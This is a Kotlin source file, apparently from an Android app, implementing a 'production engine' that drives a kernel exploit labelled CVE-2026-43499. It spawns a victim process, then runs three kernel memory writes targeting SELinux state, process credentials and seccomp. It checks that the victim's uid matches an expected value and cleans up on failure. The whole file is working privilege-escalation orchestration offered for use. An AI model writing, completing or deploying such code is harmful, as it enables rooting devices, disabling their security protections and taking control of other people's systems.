package com.ghostlock.app.engine.kernelmemory

import com.ghostlock.app.backend.cve43499.ktstep.run.Cve43499StepCatalog
import com.ghostlock.app.core.engine.NodeOutcome
import com.ghostlock.app.core.engine.PipelineEngine
import com.ghostlock.app.core.engine.RunNodeResult
import com.ghostlock.app.core.steps.StepId
import com.ghostlock.app.core.steps.StepInputs
import com.ghostlock.app.core.steps.StepOutcome
import com.ghostlock.app.core.steps.StepResult
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.currentCoroutineContext
import kotlinx.coroutines.ensureActive

/** 引擎的终态；只有 [SUCCEEDED] 表示 native 回执与 uid 判据都成立。 */
enum class EnginePhase { SUCCEEDED, FAILED }

/**
 * 一次运行的证据：终态、首个失败原因、最后的 facts、uid、步骤结果。
 *
 * 失败时 [reason] 必须原样带出 native 的具名拒绝；不得折叠成“未知失败”。
 */
data class EngineOutcome(
    val phase: EnginePhase,
    val reason: String?,
    val facts: Facts43499?,
    val uid: Long?,
    val steps: List<StepResult>,
) {
    val succeeded: Boolean get() = phase == EnginePhase.SUCCEEDED
}

/**
 * 43499 的生产引擎（K1）。
 *
 * 顺序：create → initialize → prepare → discover → spawnVictim → W1/W2/W3 → victimProbe(uid) → finishVictim → close。
 * 规则：
 *  - 任何拒绝立即停止，后续 native 0 调用；
 *  - 不确定（IN_FLIGHT）由 PipelineEngine 冻结，不重试；
 *  - 取消只在阶段边界；已 spawn 的 victim 在取消/失败时 finish；
 *  - close 在 run 的 finally 中执行一次，失败也具名。
 *
 * 本类不依赖 UI、不读配置、不猜默认值。
 */
class KernelMemoryEngine(
    private val port: Backend43499Port,
    private val log: (String) -> Unit = {},
) {
    suspend fun run(request: KernelMemoryRun): EngineOutcome {
        val problem = validate(request)
        if (problem != null) return failed(problem)
        var closeRefusal: PortRefusal? = null
        val outcome = try {
            execute(request)
        } finally {
            val closed = runCatching { port.close() }.getOrElse { problem ->
                PortResult.Refused(
                    PortRefusal(PortCode.FAILED, "close-exception:" + problem.javaClass.simpleName),
                )
            }
            if (closed is PortResult.Refused) closeRefusal = closed.refusal
        }
        if (outcome.phase == EnginePhase.SUCCEEDED && closeRefusal != null) {
            return outcome.copy(phase = EnginePhase.FAILED, reason = "close:" + closeRefusal)
        }
        return outcome
    }

    private suspend fun execute(request: KernelMemoryRun): EngineOutcome {
        var facts: Facts43499? = null
        var victimSpawned = false
        try {
            currentCoroutineContext().ensureActive()
            when (val made = port.create()) {
                is PortResult.Refused -> return failed("create:" + made.refusal)
                is PortResult.Ok -> Unit
            }
            when (val initialized = port.initialize(request.session)) {
                is PortResult.Refused -> return failed("initialize:" + initialized.refusal)
                is PortResult.Ok -> Unit
            }
            currentCoroutineContext().ensureActive()
            val prepared = when (val answer = port.prepare(request.prepare)) {
                is PortResult.Refused -> return failed("prepare:" + answer.refusal)
                is PortResult.Ok -> answer.value
            }
            facts = prepared
            if (!prepared.prepared || prepared.pageBase == 0L) return failed("prepare:facts", facts)
            currentCoroutineContext().ensureActive()
            val discoverRequest = request.discover(prepared.prepareGeneration)
            val discovered = when (val answer = port.discover(discoverRequest)) {
                is PortResult.Refused -> return failed("discover:" + answer.refusal, facts)
                is PortResult.Ok -> answer.value
            }
            facts = discovered
            if (!discovered.discovered || discovered.found == 0L) return failed("discover:facts", facts)
            currentCoroutineContext().ensureActive()
            val spawned = when (val answer = port.spawnVictim()) {
                is PortResult.Refused -> return failed("spawn:" + answer.refusal, facts)
                is PortResult.Ok -> answer.value
            }
            facts = spawned
            victimSpawned = true
            if (spawned.victimTask == 0L) return failed("spawn:victim-task", facts)
            currentCoroutineContext().ensureActive()
            val catalog = Cve43499StepCatalog()
            val (selected, selectionError) = catalog.select(listOf("w1", "w2", "w3"))
            if (selectionError != null) return failed(selectionError, facts)
            val invoker = PortOpsInvoker(port, request.steps)
            val engine = PipelineEngine(log)
            val pipeline = try {
                engine.run(catalog.nodes(selected, stepInputs(request), invoker))
            } finally {
                engine.close()
            }
            val results = pipeline.outcomes.mapNotNull { toStepResult(it) }
            if (pipeline.primary != null) {
                finishVictim(facts)
                val stopped = pipeline.primary
                val reason = when (stopped) {
                    is RunNodeResult.Refused -> stopped.reason
                    is RunNodeResult.Frozen -> stopped.reason
                    is RunNodeResult.Retryable -> stopped.reason
                    is RunNodeResult.Done -> "pipeline-failed"
                }
                return failed(reason, facts, null, results)
            }
            currentCoroutineContext().ensureActive()
            val uid = when (val answer = port.victimProbe(0)) {
                is PortResult.Refused -> {
                    finishVictim(facts)
                    return failed("probe:" + answer.refusal, facts, null, results)
                }
                is PortResult.Ok -> answer.value
            }
            if (uid != request.expectedUid) {
                finishVictim(facts)
                return failed("victim-uid:" + uid, facts, uid, results)
            }
            when (val finished = port.finishVictim(request.finishAction, spawned.victimGeneration)) {
                is PortResult.Refused -> return failed("finish:" + finished.refusal, facts, uid, results)
                is PortResult.Ok -> Unit
            }
            return EngineOutcome(EnginePhase.SUCCEEDED, null, facts, uid, results)
        } catch (cancel: CancellationException) {
            if (victimSpawned) finishVictim(facts)
            throw cancel
        } catch (problem: Exception) {
            if (victimSpawned) finishVictim(facts)
            return failed("engine-exception:" + problem.javaClass.simpleName, facts)
        }
    }

    private fun toStepResult(node: NodeOutcome): StepResult? {
        val step = StepId.ofToken(node.node.token) ?: return null
        val outcome = when (node.result) {
            is RunNodeResult.Done -> StepOutcome.Ran
            is RunNodeResult.Refused -> StepOutcome.Refused
            is RunNodeResult.Frozen -> StepOutcome.Frozen
            is RunNodeResult.Retryable -> StepOutcome.Refused
        }
        val reason = when (val result = node.result) {
            is RunNodeResult.Done -> null
            is RunNodeResult.Refused -> result.reason
            is RunNodeResult.Frozen -> result.reason
            is RunNodeResult.Retryable -> result.reason
        }
        return StepResult(step, outcome, reason, node.calls)
    }

    private fun finishVictim(facts: Facts43499?) {
        val generation = facts?.victimGeneration ?: return
        runCatching { port.finishVictim(FINISH_RETIRE, generation) }
    }

    private fun stepInputs(request: KernelMemoryRun): StepInputs {
        val w1 = request.steps.getValue(StepId.W1)
        val w2 = request.steps.getValue(StepId.W2)
        val w3 = request.steps.getValue(StepId.W3)
        return StepInputs(
            attempts = request.attempts,
            settleMs = request.settleMs,
            selinuxAddress = w1.address.toULong(),
            credentialAddress = w2.address.toULong(),
            credentialValue = w2.value.toULong(),
            seccompAddress = w3.address.toULong(),
            writeOffset = w1.offset.toULong(),
        )
    }

    private fun validate(request: KernelMemoryRun): String? {
        if (request.attempts < 1) return "invalid:attempts"
        if (request.settleMs < 0L) return "invalid:settle"
        if (request.finishAction !in 0..1) return "invalid:finish-action"
        if (request.expectedUid < 0L) return "invalid:expected-uid"
        val expected = setOf(StepId.W1, StepId.W2, StepId.W3)
        if (request.steps.keys != expected) return "invalid:steps"
        val ordered = listOf(StepId.W1, StepId.W2, StepId.W3).map { request.steps.getValue(it) }
        for ((id, step) in request.steps) {
            if (step.step != id) return "invalid:step-id"
            if (step.route <= 0) return "invalid:route:" + step.step.token
            if (step.offset < 0L) return "invalid:offset:" + step.step.token
            if (step.address == 0L) return "invalid:address:" + step.step.token
            if (step.target == 0L) return "invalid:target:" + step.step.token
            if (step.target != step.address) return "invalid:target-address:" + step.step.token
        }
        if (ordered.map { it.address }.distinct().size != ordered.size) return "invalid:address-duplicate"
        if (ordered.map { it.offset }.distinct().size != 1) return "invalid:offset-mismatch"
        return null
    }

    private fun failed(
        reason: String,
        facts: Facts43499? = null,
        uid: Long? = null,
        steps: List<StepResult> = emptyList(),
    ): EngineOutcome = EngineOutcome(EnginePhase.FAILED, reason, facts, uid, steps)

    companion object {
        private const val BACKEND = "cve_2026_43499"
        private const val FINISH_RETIRE = 0

        /* K0a：旧 K1 引擎的 production() 入口已移除；kt-step 生产路径不使用 Native43499。 */
    }
}
